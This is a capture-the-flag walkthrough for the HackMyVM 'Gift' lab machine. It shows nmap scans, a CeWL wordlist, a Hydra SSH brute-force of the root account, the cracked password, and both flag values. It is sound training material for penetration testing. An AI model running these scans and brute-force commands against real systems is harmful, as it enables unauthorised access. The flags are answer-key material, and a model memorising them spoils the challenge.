🧩 Gift Machine Walkthrough – HackMyVM
Difficulty: Easy
Goal: Gain direct root access via SSH using a weak password discovered through a brute-force attack with a custom wordlist.
Target IP: 192.168.1.135
Test Date: 14/06/2025

🔍 Initial Enumeration
Full TCP port scan:

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.135
Service and version detection on discovered ports:

nmap -sCV -p22 192.168.1.135
Discovered open port:

22/tcp – SSH

📜 Wordlist Generation for Brute Force
A custom password list was created by crawling the site using Cewl:

cewl http://192.168.1.135/index.html > pass.txt
🔑 Initial Access via Hydra SSH Brute Force
Hydra was used to brute-force the root user’s SSH login with the generated wordlist:

hydra -l root -P pass.txt ssh://192.168.1.135 -t 64 -I
Access was successfully obtained using the password: simple

SSH login:

ssh root@192.168.1.135
Confirmation:

The authenticity of host '192.168.1.135' can't be established...
root@192.168.1.135's password: simple
IM AN SSH SERVER
Access granted directly as root.

🏁 Flag Retrieval
As root, both flags were read:

user.txt → HMV665sXzDS

root.txt → HMVtyr543FG

🎯 Conclusion
The SSH-Gift machine was trivially compromised due to the following security issue:

Weak SSH credentials for the root account were susceptible to a brute-force attack using a custom wordlist.

This exercise demonstrates how even a single point of failure, such as poor password hygiene, can lead to a complete system compromise without the need for privilege escalation techniques.
